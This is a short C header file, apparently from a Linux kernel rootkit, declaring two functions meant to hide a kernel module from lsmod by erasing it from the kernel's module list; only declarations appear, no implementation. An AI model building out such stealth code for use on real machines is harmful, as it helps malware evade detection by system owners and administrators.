#ifndef HIDE_ROOTKIT_H
#define HIDE_ROOTKIT_H

#include <linux/list.h>

// -- HIDE FROM LSMOD --
void wlkom_hide_module(void);
void wlkom_erase_from_list(struct list_head *prev, struct list_head *next);


#endif

